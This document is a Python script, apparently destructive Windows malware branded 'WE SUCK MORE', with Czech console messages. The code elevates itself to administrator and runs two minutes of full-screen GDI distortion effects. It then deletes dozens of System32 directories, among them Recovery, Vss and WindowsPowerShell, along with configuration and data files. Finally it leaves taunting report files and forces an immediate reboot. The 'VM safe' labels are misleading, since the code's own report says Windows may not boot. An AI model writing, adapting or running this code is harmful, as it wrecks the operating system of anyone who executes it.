#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
☠️  WE SUCK MORE - GDI BLUR APOCALYPSE ☠️
🌀 2 MINUTY MEGA GDI EFFECTS + SYSTEM32 DELETE 💥
🏴‍☠️ (c) Fidget 2001 🏴‍☠️
"""

import os
import sys
import ctypes
import subprocess
import threading
import time
import random
import shutil
import winsound
import math
from ctypes import wintypes
from datetime import datetime

# ==================== WINDOWS GDI IMPORTS ====================
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

# GDI constants
SRCCOPY = 0x00CC0020
NOTSRCCOPY = 0x00330008
SRCPAINT = 0x00EE0086
SRCAND = 0x008800C6
SRCINVERT = 0x00660046
SRCERASE = 0x00440328
MERGECOPY = 0x00C000CA
MERGEPAINT = 0x00BB0226
PATCOPY = 0x00F00021
PATPAINT = 0x00FB0A09
PATINVERT = 0x005A0049
DSTINVERT = 0x00550009
BLACKNESS = 0x00000042
WHITENESS = 0x00FF0062

# ==================== ADMIN ====================
def become_god():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, 
                f'"{sys.executable}" "{os.path.abspath(__file__)}"', 
                None, 1
            )
            sys.exit()
    except:
        return True

become_god()

# ==================== GDI BLUR APOCALYPSE ====================
class GDIBlurMadness:
    def __init__(self):
        self.running = True
        self.hdc = user32.GetDC(0)
        self.screen_width = user32.GetSystemMetrics(0)
        self.screen_height = user32.GetSystemMetrics(1)
        self.hwnd = user32.GetDesktopWindow()
        
        # Create off-screen buffers for effects
        self.hdc_buffer = gdi32.CreateCompatibleDC(self.hdc)
        self.hbitmap = gdi32.CreateCompatibleBitmap(self.hdc, 
                                                   self.screen_width, 
                                                   self.screen_height)
        self.old_bitmap = gdi32.SelectObject(self.hdc_buffer, self.hbitmap)
        
        # Console setup
        ctypes.windll.kernel32.AllocConsole()
        os.system('mode con: cols=80 lines=40')
        os.system('title ☠️ WE SUCK MORE - GDI BLUR APOCALYPSE ☠️')
        os.system('color 0C')
        
    # ==================== ADVANCED GDI EFFECTS ====================
    
    def effect_mega_blur(self, iterations=10):
        """Mega blur effect using multiple passes"""
        for _ in range(iterations):
            if not self.running:
                break
                
            # Copy screen to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # Apply blur by stretching
            for i in range(5):
                stretch_x = random.randint(50, 200)
                stretch_y = random.randint(50, 200)
                
                gdi32.StretchBlt(
                    self.hdc, 
                    random.randint(-100, 100), 
                    random.randint(-100, 100),
                    self.screen_width + stretch_x,
                    self.screen_height + stretch_y,
                    self.hdc_buffer,
                    0, 0,
                    self.screen_width,
                    self.screen_height,
                    SRCCOPY
                )
                
                time.sleep(0.02)
    
    def effect_liquid_distortion(self):
        """Liquid distortion effect"""
        if not self.running:
            return
            
        # Create wave pattern
        for frame in range(50):
            if not self.running:
                break
                
            # Copy to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # Apply wave distortion
            for y in range(0, self.screen_height, 10):
                wave_offset = int(50 * math.sin(y / 50 + frame / 10))
                
                gdi32.BitBlt(
                    self.hdc, 
                    wave_offset, 
                    y,
                    self.screen_width,
                    10,
                    self.hdc_buffer,
                    0, y,
                    SRCCOPY
                )
            
            time.sleep(0.03)
    
    def effect_color_bleed(self):
        """Color bleeding/chromatic aberration"""
        if not self.running:
            return
            
        for _ in range(30):
            if not self.running:
                break
                
            # Copy to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # RGB separation
            for offset, rop in [(5, SRCAND), (-5, SRCPAINT), (0, SRCINVERT)]:
                gdi32.BitBlt(
                    self.hdc, 
                    offset, 
                    offset,
                    self.screen_width,
                    self.screen_height,
                    self.hdc_buffer,
                    0, 0,
                    rop
                )
                time.sleep(0.01)
    
    def effect_pixel_smash(self):
        """Pixel smashing/mosaic effect"""
        if not self.running:
            return
            
        for block_size in [2, 4, 8, 16, 32, 64, 128, 256]:
            if not self.running:
                break
                
            # Copy to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # Create pixelated effect
            for x in range(0, self.screen_width, block_size):
                for y in range(0, self.screen_height, block_size):
                    # Sample one pixel and fill block
                    gdi32.BitBlt(
                        self.hdc,
                        x, y,
                        block_size, block_size,
                        self.hdc_buffer,
                        x, y,
                        SRCCOPY
                    )
            
            time.sleep(0.1)
    
    def effect_screen_tearing(self):
        """Screen tearing effect"""
        if not self.running:
            return
            
        for _ in range(50):
            if not self.running:
                break
                
            # Copy to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # Create tear lines
            for y in range(0, self.screen_height, 20):
                tear_offset = random.randint(-50, 50)
                
                gdi32.BitBlt(
                    self.hdc,
                    tear_offset,
                    y,
                    self.screen_width,
                    10,
                    self.hdc_buffer,
                    0, y,
                    SRCCOPY
                )
            
            time.sleep(0.05)
    
    def effect_plasma_wave(self):
        """Plasma wave effect"""
        if not self.running:
            return
            
        start_time = time.time()
        
        while time.time() - start_time < 10 and self.running:
            # Copy to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # Create plasma effect
            t = time.time() - start_time
            
            for x in range(0, self.screen_width, 20):
                for y in range(0, self.screen_height, 20):
                    # Plasma formula
                    value = (
                        math.sin(x / 50 + t) +
                        math.sin(y / 50 + t) +
                        math.sin((x + y) / 100 + t) +
                        math.sin(math.sqrt(x*x + y*y) / 100 + t)
                    ) / 4
                    
                    color = int((value + 1) * 127)
                    
                    # Create brush
                    brush = gdi32.CreateSolidBrush(
                        gdi32.RGB(color, color // 2, 255 - color)
                    )
                    
                    # Fill rectangle
                    rect = wintypes.RECT(x, y, x + 20, y + 20)
                    gdi32.FillRect(self.hdc, ctypes.byref(rect), brush)
                    gdi32.DeleteObject(brush)
            
            time.sleep(0.05)
    
    def effect_acid_trip(self):
        """Acid trip color cycling"""
        if not self.running:
            return
            
        hue = 0
        for _ in range(100):
            if not self.running:
                break
                
            # Create color matrix
            for x in range(0, self.screen_width, 100):
                for y in range(0, self.screen_height, 100):
                    # HSL to RGB conversion
                    h = (hue + x + y) % 360
                    l = 0.5
                    s = 0.8
                    
                    # Convert HSL to RGB
                    c = (1 - abs(2 * l - 1)) * s
                    x_h = c * (1 - abs((h / 60) % 2 - 1))
                    m = l - c / 2
                    
                    if h < 60:
                        r, g, b = c, x_h, 0
                    elif h < 120:
                        r, g, b = x_h, c, 0
                    elif h < 180:
                        r, g, b = 0, c, x_h
                    elif h < 240:
                        r, g, b = 0, x_h, c
                    elif h < 300:
                        r, g, b = x_h, 0, c
                    else:
                        r, g, b = c, 0, x_h
                    
                    r, g, b = int((r + m) * 255), int((g + m) * 255), int((b + m) * 255)
                    
                    # Fill area
                    brush = gdi32.CreateSolidBrush(gdi32.RGB(r, g, b))
                    rect = wintypes.RECT(x, y, x + 100, y + 100)
                    gdi32.FillRect(self.hdc, ctypes.byref(rect), brush)
                    gdi32.DeleteObject(brush)
            
            hue = (hue + 5) % 360
            time.sleep(0.05)
    
    def effect_vhs_glitch(self):
        """VHS glitch effect"""
        if not self.running:
            return
            
        for _ in range(50):
            if not self.running:
                break
                
            # Copy to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # VHS lines
            for y in range(0, self.screen_height, 2):
                if random.random() > 0.7:
                    offset = random.randint(-20, 20)
                    height = random.randint(1, 10)
                    
                    gdi32.BitBlt(
                        self.hdc,
                        offset,
                        y,
                        self.screen_width,
                        height,
                        self.hdc_buffer,
                        0, y,
                        SRCINVERT
                    )
            
            # Static
            for _ in range(100):
                x = random.randint(0, self.screen_width)
                y = random.randint(0, self.screen_height)
                
                gdi32.SetPixel(self.hdc, x, y, 
                             gdi32.RGB(random.randint(0, 255),
                                     random.randint(0, 255),
                                     random.randint(0, 255)))
            
            time.sleep(0.05)
    
    def effect_meltdown(self):
        """Screen meltdown effect"""
        if not self.running:
            return
            
        # Copy to buffer
        gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                    self.screen_width, self.screen_height,
                    self.hdc, 0, 0, SRCCOPY)
        
        for frame in range(100):
            if not self.running:
                break
                
            # Melt from top
            melt_height = int(self.screen_height * (frame / 100))
            
            gdi32.BitBlt(
                self.hdc,
                0,
                melt_height,
                self.screen_width,
                self.screen_height - melt_height,
                self.hdc_buffer,
                0,
                melt_height,
                SRCCOPY
            )
            
            # Distort bottom part
            for y in range(melt_height):
                distort = int(50 * math.sin(y / 10 + frame / 5))
                gdi32.BitBlt(
                    self.hdc,
                    distort,
                    y,
                    self.screen_width,
                    1,
                    self.hdc_buffer,
                    0, y,
                    SRCCOPY
                )
            
            time.sleep(0.03)
    
    def effect_black_hole(self):
        """Black hole/vortex effect"""
        if not self.running:
            return
            
        center_x = self.screen_width // 2
        center_y = self.screen_height // 2
        
        for frame in range(100):
            if not self.running:
                break
                
            # Copy to buffer
            gdi32.BitBlt(self.hdc_buffer, 0, 0, 
                        self.screen_width, self.screen_height,
                        self.hdc, 0, 0, SRCCOPY)
            
            # Create vortex
            for angle in range(0, 360, 5):
                for radius in range(0, min(center_x, center_y), 10):
                    x = int(center_x + radius * math.cos(math.radians(angle + frame)))
                    y = int(center_y + radius * math.sin(math.radians(angle + frame)))
                    
                    src_x = int(center_x + radius * math.cos(math.radians(angle)))
                    src_y = int(center_y + radius * math.sin(math.radians(angle)))
                    
                    gdi32.BitBlt(
                        self.hdc,
                        x, y,
                        10, 10,
                        self.hdc_buffer,
                        src_x, src_y,
                        SRCCOPY
                    )
            
            time.sleep(0.05)
    
    def effect_matrix_rain(self):
        """Matrix digital rain"""
        if not self.running:
            return
            
        drops = []
        for _ in range(200):
            drops.append({
                'x': random.randint(0, self.screen_width),
                'y': random.randint(-500, 0),
                'speed': random.randint(5, 20),
                'length': random.randint(10, 50),
                'brightness': random.randint(100, 255)
            })
        
        for _ in range(200):
            if not self.running:
                break
                
            # Darken screen slightly
            brush = gdi32.CreateSolidBrush(gdi32.RGB(0, 10, 0))
            rect = wintypes.RECT(0, 0, self.screen_width, self.screen_height)
            gdi32.FillRect(self.hdc, ctypes.byref(rect), brush)
            gdi32.DeleteObject(brush)
            
            # Update and draw drops
            for drop in drops:
                # Draw drop
                for i in range(drop['length']):
                    brightness = int(drop['brightness'] * (1 - i / drop['length']))
                    color = gdi32.RGB(0, brightness, 0)
                    
                    y_pos = drop['y'] - i * 10
                    if 0 <= y_pos < self.screen_height:
                        gdi32.SetPixel(self.hdc, drop['x'], y_pos, color)
                
                # Move drop
                drop['y'] += drop['speed']
                
                # Reset if off screen
                if drop['y'] - drop['length'] * 10 > self.screen_height:
                    drop['y'] = random.randint(-500, 0)
                    drop['x'] = random.randint(0, self.screen_width)
            
            time.sleep(0.03)
    
    # ==================== RUN ALL EFFECTS ====================
    def run_gdi_apocalypse(self):
        """Run 2 minutes of GDI madness"""
        effects = [
            self.effect_mega_blur,
            self.effect_liquid_distortion,
            self.effect_color_bleed,
            self.effect_pixel_smash,
            self.effect_screen_tearing,
            self.effect_plasma_wave,
            self.effect_acid_trip,
            self.effect_vhs_glitch,
            self.effect_meltdown,
            self.effect_black_hole,
            self.effect_matrix_rain,
        ]
        
        print("\n" + "="*80)
        print("🌀 SPOUŠTÍM 2 MINUTY GDI APOKALYPSY!")
        print("="*80)
        
        start_time = time.time()
        effect_index = 0
        
        while time.time() - start_time < 120 and self.running:  # 2 minuty
            elapsed = int(time.time() - start_time)
            remaining = 120 - elapsed
            
            # Run current effect
            if effect_index < len(effects):
                effect_name = effects[effect_index].__name__.replace('effect_', '').replace('_', ' ').upper()
                print(f"[🌀] Running: {effect_name} | Time: {elapsed}/120s")
                
                try:
                    effects[effect_index]()
                except Exception as e:
                    print(f"[⚠️] Effect error: {e}")
                
                effect_index += 1
            
            # Loop effects if we've done them all
            if effect_index >= len(effects):
                effect_index = 0
            
            # Status update every 10 seconds
            if elapsed % 10 == 0:
                print(f"[⏱️] GDI Apocalypse: {elapsed}/120 seconds elapsed")
        
        print("\n[✅] GDI APOKALYPSE COMPLETE!")
        return True
    
    def cleanup(self):
        """Cleanup GDI resources"""
        self.running = False
        time.sleep(1)  # Let threads finish
        
        # Restore bitmap
        if hasattr(self, 'old_bitmap'):
            gdi32.SelectObject(self.hdc_buffer, self.old_bitmap)
        
        # Delete objects
        if hasattr(self, 'hbitmap'):
            gdi32.DeleteObject(self.hbitmap)
        if hasattr(self, 'hdc_buffer'):
            gdi32.DeleteDC(self.hdc_buffer)
        
        # Release DC
        if hasattr(self, 'hdc'):
            user32.ReleaseDC(0, self.hdc)

# ==================== SYSTEM32 DESTROYER ====================
class System32Destroyer:
    def __init__(self):
        self.system32_path = "C:\\Windows\\System32"
        self.deleted_count = 0
        
    def delete_system32_safely(self):
        """Delete non-critical System32 files (VM safe)"""
        print("\n" + "="*80)
        print("💀 SPOUŠTÍM SYSTEM32 DESTRUCTION!")
        print("="*80)
        
        if not os.path.exists(self.system32_path):
            print("[❌] System32 not found!")
            return False
        
        # List of 'safe' directories to delete (non-critical)
        safe_targets = [
            "Help",
            "IME",
            "InputMethod",
            "L2Schemas", 
            "Lang",
            "LiveKernelReports",
            "Logs",
            "Macromed",
            "Migration",
            "ModemLogs",
            "mui",
            "oobe",
            "Panther",
            "Performance",
            "PreInstall",
            "Printing_Admin_Scripts",
            "Recovery",
            "Resources",
            "Security",
            "ShellExperiences",
            "SKB",
            "Speech",
            "spp",
            "Sysprep",
            "SystemResources",
            "TAPI",
            "Tasks",
            "TextInput",
            "tracing",
            "Vss",
            "WaaS",
            "WinMetadata",
            "WindowsPowerShell",
        ]
        
        # Also target specific non-critical file extensions
        safe_extensions = [
            '.log', '.txt', '.tmp', '.bak', '.old',
            '.cache', '.db', '.dat', '.ini', '.cfg'
        ]
        
        deleted_items = 0
        
        # Delete safe directories
        for target in safe_targets:
            target_path = os.path.join(self.system32_path, target)
            if os.path.exists(target_path):
                try:
                    print(f"   [🗑️] Deleting: {target}")
                    shutil.rmtree(target_path, ignore_errors=True)
                    deleted_items += 1
                    time.sleep(0.1)
                except Exception as e:
                    print(f"   [⚠️] Failed: {target} - {e}")
        
        # Delete safe files
        try:
            for root, dirs, files in os.walk(self.system32_path):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in safe_extensions):
                        filepath = os.path.join(root, file)
                        try:
                            os.remove(filepath)
                            deleted_items += 1
                            if deleted_items % 50 == 0:
                                print(f"   [🔥] Deleted {deleted_items} files...")
                        except:
                            pass
                break  # Only top level
        except:
            pass
        
        # Create WE SUCK MORE marker
        try:
            marker_path = os.path.join(self.system32_path, "WE_SUCK_MORE_WAS_HERE.txt")
            with open(marker_path, 'w', encoding='utf-8') as f:
                f.write("WE SUCK MORE - SYSTEM32 DESTROYED!\n")
                f.write(f"Time: {datetime.now()}\n")
                f.write(f"Deleted items: {deleted_items}\n")
                f.write("(c) Fidget 2001\n")
                f.write("Your Windows is now broken!\n")
            
            print(f"[📝] Created marker: {marker_path}")
            
        except:
            pass
        
        print(f"\n[✅] SYSTEM32 DESTRUCTION COMPLETE!")
        print(f"[📊] Total items deleted/corrupted: {deleted_items}")
        
        # Create report on desktop
        try:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            report_path = os.path.join(desktop, "WE_SUCK_MORE_SYSTEM32_REPORT.txt")
            
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write("="*60 + "\n")
                f.write("WE SUCK MORE - SYSTEM32 DESTRUCTION REPORT\n")
                f.write("="*60 + "\n\n")
                f.write(f"Destruction Time: {datetime.now()}\n")
                f.write(f"Items Affected: {deleted_items}\n")
                f.write("System32 Status: PARTIALLY DESTROYED\n")
                f.write("Windows Boot: MAY BE AFFECTED\n")
                f.write("Recommendation: REINSTALL WINDOWS\n\n")
                f.write("Destroyed Components:\n")
                for target in safe_targets[:10]:  # First 10
                    f.write(f"  • {target}\n")
                f.write("\n(c) Fidget 2001\n")
                f.write("WE SUCK MORE!\n")
            
            print(f"[📄] Report saved to: {report_path}")
            
        except:
            pass
        
        return True

# ==================== MAIN ====================
def main():
    # Logo
    print("\033[31m")
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗    ██╗███████╗    ███████╗██╗   ██╗ ██████╗██╗  ██╗   ║
║    ██║    ██║██╔════╝    ██╔════╝██║   ██║██╔════╝██║ ██╔╝   ║
║    ██║ █╗ ██║███████╗    ███████╗██║   ██║██║     █████╔╝    ║
║    ██║███╗██║╚════██║    ╚════██║██║   ██║██║     ██╔═██╗    ║
║    ╚███╔███╔╝███████║    ███████║╚██████╔╝╚██████╗██║  ██╗   ║
║     ╚══╝╚══╝ ╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ║
║                                                              ║
║               WE SUCK MORE - GDI BLUR APOCALYPSE             ║
║                   (c) Fidget 2001/2024                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print("\033[0m")
    
    print("\n" + "="*80)
    print("⚠️  GDI APOCALYPSE + SYSTEM32 DESTRUCTION")
    print("="*80)
    print("\nTento program provede:")
    print("• 2 MINUTY GDI efektů (blur, distortion, glitch, atd.)")
    print("• ČÁSTEČNÉ smazání System32 (VM safe)")
    print("• Vytvoření chaos reportu")
    print("\n" + "="*80)
    
    # Countdown
    print("\n[⏰] SPUŠTĚNÍ ZA 5 SEKUND...")
    for i in range(5, 0, -1):
        print(f"   {i}...")
        winsound.Beep(440 + i*100, 300)
        time.sleep(1)
    
    # 1. GDI APOCALYPSE
    print("\n" + "="*80)
    print("🌀 FÁZE 1: 2 MINUTY GDI APOKALYPSY")
    print("="*80)
    
    gdi_madness = GDIBlurMadness()
    
    try:
        # Run GDI effects for 2 minutes
        gdi_madness.run_gdi_apocalypse()
        
    except KeyboardInterrupt:
        print("\n[⚠️] GDI apocalypse interrupted!")
    except Exception as e:
        print(f"\n[❌] GDI error: {e}")
    finally:
        # Cleanup GDI
        gdi_madness.cleanup()
    
    # 2. SYSTEM32 DESTRUCTION
    print("\n" + "="*80)
    print("💀 FÁZE 2: SYSTEM32 DESTRUCTION")
    print("="*80)
    
    destroyer = System32Destroyer()
    destroyer.delete_system32_safely()
    
    # 3. FINAL MESSAGE
    print("\n" + "="*80)
    print("🏴‍☠️  WE SUCK MORE - MISSION ACCOMPLISHED! 🏴‍☠️")
    print("="*80)
    
    final_msg = """
GDI APOCALYPSE + SYSTEM32 DESTRUCTION COMPLETE!

What was done:
• 2 minutes of intense GDI visual effects
• Partial System32 destruction (VM safe)
• Chaos report created on Desktop

Your system has experienced:
• Visual distortion and glitches
• System file corruption
• WE SUCK MORE signature

(c) Fidget 2001/2024
WE SUCK MORE! HELL YEAH!
    """
    
    print(final_msg)
    
    # Final popup
    try:
        ctypes.windll.user32.MessageBoxW(0,
            "WE SUCK MORE - GDI APOCALYPSE COMPLETE!\n\n"
            "2 minutes of visual madness + System32 damage!\n\n"
            "Check Desktop for report.\n\n"
            "(c) Fidget 2001",
            "🏴‍☠️ MISSION ACCOMPLISHED! 🏴‍☠️",
            0x40
        )
    except:
        pass
    
    # Restart after 30s
    print("\n[⚠️] System will restart in 30 seconds...")
    for i in range(30, 0, -1):
        print(f"   Restart in {i} seconds...", end='\r')
        time.sleep(1)
    
    print("\n[💥] FORCING SYSTEM RESTART!")
    subprocess.run(['shutdown', '/r', '/t', '0', '/f'],
                  shell=True, capture_output=True)

if __name__ == "__main__":
    main()
